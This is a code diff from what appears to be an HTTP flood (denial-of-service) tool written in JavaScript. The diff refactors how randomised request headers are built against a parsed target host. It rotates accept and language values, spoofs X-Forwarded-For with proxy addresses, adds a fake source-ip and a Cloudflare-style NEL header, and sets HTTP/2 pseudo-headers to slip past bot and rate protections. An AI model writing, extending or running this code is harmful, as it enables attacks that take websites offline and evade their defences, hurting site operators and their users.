@@ -475,28 +475,36 @@ const randstrsValue = randstrs(10);
 
  return randomStringArray.join('');
 }
- const val = { 'NEl': JSON.stringify({
-			"report_to": Math.random() < 0.5 ? "cf-nel" : 'default',
-			"max-age": Math.random() < 0.5 ? 604800 : 2561000,
-			"include_subdomains": Math.random() < 0.5 ? true : false}),
-            }
+ const randomBoolean = () => Math.random() < 0.5;
 
-     const rateHeaders = [
-        {"accept" :accept_header[Math.floor(Math.random() * accept_header.length)]},
-        {"Access-Control-Request-Method": "GET"},
-        { "accept-language" : language_header[Math.floor(Math.random() * language_header.length)]},
-        { "origin": "https://" + parsedTarget.host},
-        { "source-ip": randstr(5)  },
-        //{"x-aspnet-version" : randstrsValue},
-        { "data-return" :"false"},
-        {"X-Forwarded-For" : parsedProxy[0]},
-        {"NEL" : val},
-        {"dnt" : "1" },
-        { "A-IM": "Feed" },
-        {'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none'},
-       {'Delta-Base' : '12340001'},
-       {"te": "trailers"},
-       {"accept-language": language_header[Math.floor(Math.random() * language_header.length)]},
+const val = {
+    'NEl': JSON.stringify({
+        "report_to": randomBoolean() ? "cf-nel" : "default",
+        "max-age": randomBoolean() ? 604800 : 2561000,
+        "include_subdomains": randomBoolean()
+    })
+};
+
+const randomAcceptHeader = accept_header[Math.floor(Math.random() * accept_header.length)];
+const randomLanguageHeader = language_header[Math.floor(Math.random() * language_header.length)];
+const targetHost = "https://" + parsedTarget.host;
+const proxyAddress = parsedProxy[0];
+
+const rateHeaders = [
+    { "accept": randomAcceptHeader },
+    { "Access-Control-Request-Method": "GET" },
+    { "accept-language": randomLanguageHeader },
+    { "origin": parsedTarget.host },
+    { "source-ip": randstr(5) },
+    { "data-return": "false" },
+    { "X-Forwarded-For": proxyAddress },
+    { "NEL": val },
+    { "dnt": "1" },
+    { "A-IM": "Feed" },
+    { "Accept-Range": randomBoolean() ? "bytes" : "none" },
+    { "Delta-Base": "12340001" },
+    { "te": "trailers" },
+    { "accept-language": randomLanguageHeader }, // Sama seperti di atas untuk konsistensi
 ];
 let headers = {
   ":authority": parsedTarget.host,
